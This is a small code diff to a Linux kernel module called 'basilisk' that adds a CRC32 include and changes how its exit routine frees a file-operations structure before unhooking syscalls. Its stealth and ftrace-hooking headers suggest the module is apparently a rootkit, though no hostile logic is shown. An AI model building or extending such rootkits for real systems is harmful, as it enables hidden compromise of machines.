@@ -17,6 +17,7 @@
 #include "include/ftrace_helper.h"
 #include "include/stealth_helper.h"
 #include "include/utils.h"
+#include "include/crc32.h"
 
 
 MODULE_LICENSE("GPL");
@@ -359,7 +360,7 @@ static int __init basilisk_init(void)
 
 static void __exit basilisk_exit(void)
 {
-    cleanup_fops(king_fops); // free king_fops
+    kfree(king_fops); // free king_fops
     /* Unhook and restore the syscalls */
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
     printk(KERN_INFO "basilisk: unloaded\n");
